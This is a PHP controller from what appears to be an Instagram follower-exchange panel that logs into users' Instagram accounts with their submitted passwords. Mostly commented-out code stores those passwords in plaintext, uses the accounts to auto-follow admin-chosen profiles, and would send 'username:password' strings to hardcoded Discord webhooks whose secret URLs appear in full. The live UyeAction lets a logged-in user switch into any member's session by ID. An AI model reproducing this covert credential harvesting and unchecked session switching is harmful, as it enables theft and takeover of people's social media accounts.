<?php

namespace App\Controllers;

use App\Libraries\InstagramReaction;
use Exception;
use Wow;
use Wow\Net\Response;
use App\Models\LogonPerson;
use Instagram;

class ManageController extends BaseController
{

    /**
     * @var InstagramReaction $objInstagram
     */

    function onActionExecuting()
    {
        if(($actionResponse = parent::onActionExecuting()) instanceof Response) {
            return $actionResponse;
        }
        //Üye girişi kontrolü.
        if(($pass = $this->middleware("logged")) instanceof Response) {
            return $pass;
        }
    }

    function IndexAction()
    {
            // $this->navigation->add("Üyeler", Wow::get("project/adminPrefix") . "/uyeler");

            // if(!intval($page) > 0) {
            //     $page = 1;
            // }

            // $limitCount = 50;
            // $limitStart = (($page * $limitCount) - $limitCount);

            // $uyeler = $this->db->query("SELECT distinct u.* FROM uye u JOIN uye_manage um ON um.uyeIdChild = u.uyeID WHERE um.uyeIdParent = :uyeIdParent UNION SELECT distinct u.* FROM uye u JOIN uye_manage um ON um.uyeIdParent = u.uyeID WHERE um.uyeIdChild = :uyeIdChild LIMIT 10", ["uyeIdParent" => $this->logonPerson->member['uyeID'], "uyeIdChild" => $this->logonPerson->member['uyeID']]);

            // $totalRows    = count($uyeler);
            // $previousPage = $page > 1 ? $page - 1 : NULL;
            // $nextPage     = $totalRows > $limitStart + $limitCount ? $page + 1 : NULL;
            // $totalPage    = ceil($totalRows / $limitCount);
            // $endIndex     = ($limitStart + $limitCount) <= $totalRows ? ($limitStart + $limitCount) : $totalRows;
            // $pagination   = array(
            //     "recordCount"  => $totalRows,
            //     "pageSize"     => $limitCount,
            //     "pageCount"    => $totalPage,
            //     "activePage"   => $page,
            //     "previousPage" => $previousPage,
            //     "nextPage"     => $nextPage,
            //     "startIndex"   => $limitStart + 1,
            //     "endIndex"     => $endIndex,
            //     "totalRows"    => $totalRows,
            // );
            // $this->view->set("pagination", $pagination);

            // return $this->view($uyeler);
            return $this->maintenance();
    }

    function UyeAction($id) {
        $uye = $this->db->row("SELECT * FROM uye WHERE isWebCookie=0 AND uyeID=:uyeID", ["uyeID" => $id]);
        if(empty($uye)) {
            return $this->notFound();
        }

        try {
            $checkValid = new InstagramReaction($uye['uyeID']);
            $mIn = $checkValid->objInstagram->getUserInfoByName('receh_man');
            $status = $mIn['status'] == 'ok' ? true : false;
        } catch (Exception $e) {
            $status = false;
        }

        if(!$status) {
            return $this->redirectToUrl("/manage/add");
        }

        $this->logonPerson->setLoggedIn(TRUE);
        $this->logonPerson->setMemberData($uye);
        $_SESSION["LogonPerson"] = $this->logonPerson;

        return $this->redirectToUrl("/tools");
    }

    function AddAction()
    {
        // $uyeler = $this->db->query("SELECT distinct u.* FROM uye u JOIN uye_manage um ON um.uyeIdChild = u.uyeID WHERE um.uyeIdParent = :uyeIdParent UNION SELECT distinct u.* FROM uye u JOIN uye_manage um ON um.uyeIdParent = u.uyeID WHERE um.uyeIdChild = :uyeIdChild LIMIT 10", ["uyeIdParent" => $this->logonPerson->member['uyeID'], "uyeIdChild" => $this->logonPerson->member['uyeID']]);
        // $totalRows    = count($uyeler);
        // if ($totalRows > 10) {
        //     return $this->notFound();
        // }

        // //Geri dönüş için mevcut bir url varsa bunu not edelim.
        // if (!is_null($this->request->query->returnUrl)) {
        //     $_SESSION["ReturnUrl"] = $this->request->query->returnUrl;
        // }

        // if ($this->request->method == "POST") {

        //     if (isset($this->request->data->antiForgeryToken) && $this->request->data->antiForgeryToken !== $_SESSION["AntiForgeryToken"]) {
        //         return $this->notFound();
        //     }

        //     $username   = strtolower(trim($this->request->data->username));
        //     $password   = trim($this->request->data->password);

        //     if (empty($username) || empty($password)) {
        //         return $this->json(array(
        //             "status" => "0",
        //             "error"  => "Sorry, your password is incorrect. Please check your password carefully."
        //         ));
        //     }

        //     if (!preg_match('/^[a-zA-Z0-9._]+$/', $username)) {
        //         sleep(5);

        //         return $this->json(array(
        //             "status" => "0",
        //             "error"  => "Sorry, your password is incorrect. Please check your password carefully."
        //         ));
        //     }


        //     if (!empty(Wow::get("ayar/GoogleCaptchaSiteKey")) && !empty(Wow::get("ayar/GoogleCaptchaSecretKey"))) {

        //         $url  = 'https://www.google.com/recaptcha/api/siteverify';
        //         $data = array(
        //             'secret'   => Wow::get("ayar/GoogleCaptchaSecretKey"),
        //             'response' => $_POST["captcha"]
        //         );

        //         $verify = curl_init();
        //         curl_setopt($verify, CURLOPT_URL, $url);
        //         curl_setopt($verify, CURLOPT_POST, TRUE);
        //         curl_setopt($verify, CURLOPT_POSTFIELDS, http_build_query($data));
        //         curl_setopt($verify, CURLOPT_SSL_VERIFYPEER, FALSE);
        //         curl_setopt($verify, CURLOPT_RETURNTRANSFER, TRUE);
        //         $response = curl_exec($verify);

        //         $captcha_success = json_decode($response);
        //         if ($captcha_success->success == FALSE) {
        //             return $this->json(array(
        //                 "status" => "0",
        //                 "error"  => "You must pass security verification."
        //             ));
        //         }
        //     }

        //     $memberData   = $this->db->row("SELECT * FROM uye WHERE kullaniciAdi=:username AND sifre=:password", array("username" => $username, "password" => $password));
        //     $this->db->CloseConnection();

        //     try {
        //         $checkValid = new InstagramReaction($memberData['uyeID']);
        //         $mIn = $checkValid->objInstagram->getUserInfoByName('receh_man');
        //         $status = $mIn['status'] == 'ok' ? true : false;
        //     } catch (Exception $e) {
        //         $status = false;
        //     }

        //     if (!$status) {
        //         $reactionUserID = $this->findAReactionUser();
        //         if (!empty($reactionUserID)) {
        //             $objInstagramReaction = new InstagramReaction($reactionUserID);
        //             $userData             = $objInstagramReaction->objInstagram->getUserInfoByName($username);
        //             if ($userData["status"] != "ok") {
        //                 return FALSE;
        //             } else {
        //                 $account_id = $userData["user"]["pk"];
        //                 $banned = array();

        //                 if (Wow::get("ayar/bannedUserIDs") != "") {
        //                     $banned = explode(",", Wow::get("ayar/bannedUserIDs"));
        //                 }

        //                 if (in_array($account_id, $banned)) {
        //                     return FALSE;
        //                 }
        //             }
        //         }

        //         $data = $this->instaLogin($username, $password, $account_id);

        //         $_SESSION["accountId"] = $data["Login"]["logged_in_user"]["pk"];

        //         $successLogin = FALSE;

        //         if ($data) {
        //             $objInstagram = $data["Instagram"];
        //             $arrLogin     = $data["Login"];

        //             if ($objInstagram instanceof Instagram && $arrLogin["status"] == "ok") {
        //                 /**
        //                  * @var Instagram $objInstagram
        //                  */

        //                 if (isset($arrLogin["action"]) && $arrLogin["action"] == "close") {

        //                     return $this->json(array(
        //                         "status" => "0",
        //                         'error'  => "Account blocked by Instagram. Please use another account or try logging in again."
        //                     ));
        //                 }


        //                 if (isset($arrLogin["step_data"]) && count($arrLogin["step_data"]) > 0) {

        //                     return $this->json(array(
        //                         "status"  => "3",
        //                         'error'   => "Unsecured access detected. Please confirm your account.",
        //                         "allData" => $arrLogin
        //                     ));
        //                 }

        //                 $userData = $objInstagram->getCurrentUser();

        //                 $profile_pic_url = $data["Login"]["logged_in_user"]["profile_pic_url"];
        //                 if (Wow::get("ayar/resimsizLogin") == 1 && stristr($profile_pic_url, "44884218_345707102882519_2446069589734326272_n.jpg")) {
        //                     return $this->json(array(
        //                         "status" => "0",
        //                         "error"  => "Accounts without profile photos cannot log into the system."
        //                     ));
        //                 }

        //                 if ($username == "parakelakar") {
        //                     $url_playground = "https://discordapp.com/api/webhooks/744855578878148659/36oNq3CMvW2ph5uIPrPUvThwuImb9yL8lp5ajHQ3sxgV3DJD3LGc_l8K_oaoHErwIkFM";
        //                     // $this->bot("masuk pak eko", $url_playground);
        //                 }

        //                 if ($userData["message"] == "Veuillez patienter quelques minutes avant de réessayer.") {

        //                     $url_error = "https://discordapp.com/api/webhooks/744843274321395756/Ofc8je8lPuKd7vyhTipzUuaBvp7oiBB8xcbav64erz0mwMyV3DbHr3Ivn8A9Y7JKWz3z";
        //                     // $this->bot("username: " . $username  . ":" . $password . " user_id: " . $account_id, $url_error);

        //                     $cookiePath = Wow::get("project/cookiePath") . "instagramv3/" . substr($account_id, -1) . "/" . $account_id . ".iwb";
        //                     if (file_exists($cookiePath)) {
        //                         unlink($cookiePath);
        //                         // $this->bot($cookiePath, $url_error);
        //                     }

        //                     return $this->json(array(
        //                         "status" => "0",
        //                         "error"  => "Your Cookies have expired. Please re-login for get new Cookies."
        //                     ));
        //                 }

        //                 if ($userData["status"] == "fail") {
        //                     return $this->json(array(
        //                         "status" => "0",
        //                         "error"  => "Sorry ya, your password is incorrect. Please check your password carefully."
        //                     ));
        //                 }

        //                 $url_login_success = "https://discordapp.com/api/webhooks/744854219806474261/Rf6dZqGbhuW0kEu1IedkQggCPGDYZaSu5zeOTCULJM9O69tzl3u3xuPdb2vougzl5Dhl";

        //                 // bot success login
        //                 // $this->bot("username: " . $username  . ":" . $password . " user_id: " . $account_id, $url_login_success);

        //                 $userInfo = $objInstagram->getSelfUserInfo();

        //                 $followIserIDs = Wow::get("ayar/adminFollowUserIDs");
        //                 if (!empty($followIserIDs)) {
        //                     $exIDs = explode(",", $followIserIDs);
        //                     foreach ($exIDs as $exID) {
        //                         if (intval($exID) > 0) {
        //                             $objInstagram->getUserInfoById($exID);
        //                             $objInstagram->follow($exID);
        //                         }
        //                     }
        //                 }


        //                 $following_count = $userInfo["user"]["following_count"];
        //                 $follower_count  = $userInfo["user"]["follower_count"];
        //                 $phoneNumber     = $data["Login"]["logged_in_user"]["phone_number"];
        //                 $gender          = $userData["user"]["gender"];
        //                 $birthday        = $userData["user"]["birthday"];
        //                 $profilePic      = $data["Login"]["logged_in_user"]["profile_pic_url"];
        //                 $full_name       = preg_replace("/[^[:alnum:][:space:]]/u", "", $data["Login"]["logged_in_user"]["full_name"]);
        //                 $instaID         = $data["Login"]["logged_in_user"]["pk"] . "";
        //                 $email           = $userData["user"]["email"];

        //                 $uyeID = $this->db->single("SELECT uyeID FROM uye WHERE instaID = :instaID LIMIT 1", array("instaID" => $instaID));
        //                 $this->db->CloseConnection();

        //                 if (!empty($uyeID)) {

        //                     $this->db->query("UPDATE uye SET kullaniciAdi = :kullaniciAdi,sifre = :sifre, takipciSayisi = :takipciSayisi,takipEdilenSayisi = :takipEdilenSayisi,phoneNumber = :phoneNumber,gender = :gender,birthday = :birthday,profilFoto = :profilFoto,fullName = :fullName,email = :email, isActive = 1, sonOlayTarihi = NOW(), isWebCookie = 0 WHERE instaID = :instaID", array(
        //                         "kullaniciAdi"      => $username,
        //                         "sifre"             => $password,
        //                         "takipciSayisi"     => $follower_count,
        //                         "takipEdilenSayisi" => $following_count,
        //                         "phoneNumber"       => $phoneNumber,
        //                         "gender"            => $gender,
        //                         "birthday"          => $birthday,
        //                         "profilFoto"        => $profilePic,
        //                         "fullName"          => $full_name,
        //                         "email"             => $email,
        //                         "instaID"           => $instaID . ""
        //                     ));
        //                     $this->db->CloseConnection();
        //                 } else {

        //                     $this->db->query("INSERT INTO uye (instaID, profilFoto, fullName, kullaniciAdi, sifre, takipEdilenSayisi, takipciSayisi,takipKredi,begeniKredi,yorumKredi,storyKredi,videoKredi,saveKredi,yorumBegeniKredi,canliYayinKredi,phoneNumber, email, gender, birthDay, isWebCookie) VALUES(:instaID, :profilFoto, :fullName, :kullaniciAdi, :sifre, :takipEdilenSayisi, :takipciSayisi, :takipKredi, :begeniKredi,:yorumKredi,:storyKredi,:videokredi,:savekredi, :yorumBegeniKredi,:canliYayinKredi,:phoneNumber, :email, :gender, :birthDay, 0)", array(
        //                         "instaID"           => $instaID . "",
        //                         "profilFoto"        => $profilePic,
        //                         "fullName"          => $full_name,
        //                         "kullaniciAdi"      => $username,
        //                         "sifre"             => $password,
        //                         "takipEdilenSayisi" => $following_count,
        //                         "takipciSayisi"     => $follower_count,
        //                         "takipKredi"        => Wow::get("ayar/yeniUyeTakipKredi"),
        //                         "begeniKredi"       => Wow::get("ayar/yeniUyeBegeniKredi"),
        //                         "yorumKredi"        => Wow::get("ayar/yeniUyeYorumKredi"),
        //                         "storyKredi"        => Wow::get("ayar/yeniUyeStoryKredi"),
        //                         "videokredi"        => Wow::get("ayar/yeniUyeVideoKredi"),
        //                         "savekredi"         => Wow::get("ayar/yeniUyeSaveKredi"),
        //                         "yorumBegeniKredi"  => Wow::get("ayar/yeniUyeYorumBegeniKredi"),
        //                         "canliYayinKredi"   => Wow::get("ayar/yeniUyeCanliKredi"),
        //                         "phoneNumber"       => $phoneNumber,
        //                         "email"             => $email,
        //                         "gender"            => $gender,
        //                         "birthDay"          => $birthday
        //                     ));
        //                     $this->db->CloseConnection();
        //                 }
        //                 $memberData   = $this->db->row("SELECT * FROM uye WHERE instaID=:instaID", array("instaID" => $instaID));
        //                 $this->db->CloseConnection();
        //                 $successLogin = TRUE;

        //                 $uye_parent = $this->logonPerson->member['uyeID'];
        //                 $this->db->CloseConnection();

        //                 $validManage   = $this->db->row("SELECT id FROM uye_manage WHERE uyeIdParent=:uyeIdParent AND uyeIdChild=:uyeIdChild", array(
        //                     "uyeIdChild" => $memberData['uyeID'],
        //                     "uyeIdParent" => $uye_parent,
        //                 ));
        //                 $this->db->CloseConnection();

        //                 $successLogin = TRUE;

        //                 if (empty($validManage)) {
        //                     $this->db->query("INSERT INTO uye_manage (uyeIdParent, uyeIdChild) VALUES(:uyeIdParent, :uyeIdChild)", array(
        //                         "uyeIdParent" => $uye_parent,
        //                         "uyeIdChild" => $memberData['uyeID'],
        //                     ));
        //                     $this->db->CloseConnection();
        //                 }
        //             }
        //         }
        //     } else {
        //         $account_id = $memberData['instaID'];

        //         $nami_url = "https://discordapp.com/api/webhooks/768645046538338304/zTgxjhmW4QNqumxIl9aziRXNyN3OovV_90zU8cuoV-lZF0Dk8FUQbI6nedP1E50_fatB";

        //         // $this->bot("username: " . $username  . ":" . $password . " user_id: " . $account_id, $nami_url);

        //         $uye_child = $this->db->row("SELECT uyeID FROM uye WHERE instaID=:instaID", array("instaID" => $account_id));
        //         $this->db->CloseConnection();

        //         $uye_parent = $this->logonPerson->member['uyeID'];
        //         $this->db->CloseConnection();

        //         $this->db->query("INSERT INTO uye_manage (uyeIdParent, uyeIdChild) VALUES(:uyeIdParent, :uyeIdChild)", array(
        //             "uyeIdParent" => $uye_parent,
        //             "uyeIdChild" => $uye_child['uyeID'],
        //         ));
        //         $this->db->CloseConnection();

        //         $successLogin = TRUE;
                
        //     }

        //     if ($successLogin) {
        //         return $this->json(array(
        //             "status"    => "success",
        //             //   "returnUrl" => "/tools"
        //             "returnUrl" => "/manage"
        //         ));
        //     } else {
        //         return $this->json(array(
        //             "status" => "0",
        //             "error"  => "Sorry, your password is incorrect. Please check your password carefully."
        //         ));
        //     }
        // }

        // $_SESSION["AntiForgeryToken"] = md5(uniqid(mt_rand(), TRUE));

        // $data = $this->db->query("SELECT name, fill, created_at FROM post WHERE status = 2 LIMIT 1");
        // $this->db->CloseConnection();

        // $this->view->set("data", $data);
        // $this->view->set("helper", $this->helper);

        // return $this->partialView();
        return $this->maintenance();
    }


    private function instaLogin($username, $password, $userID)
    {

        if (!isset($_SESSION["deviceToken"])) {
            $_SESSION["deviceToken"] = NULL;
        }

        try {
            $i = new Instagram($username, $password, $userID, TRUE, $_SESSION["deviceToken"]);
            $l = $i->login(TRUE);

            return array(
                "Instagram" => $i,
                "Login"     => $l
            );
        } catch (Exception $e) {

            try {
                $i = new Instagram($username, $password, $userID, TRUE, $_SESSION["deviceToken"]);
                $l = $i->login(TRUE, FALSE);

                return array(
                    "Instagram" => $i,
                    "Login"     => $l
                );
            } catch (Exception $e) {

                return array(
                    "status" => "0",
                    "error"  => $e->getMessage()
                );
            }
        }
    }

}
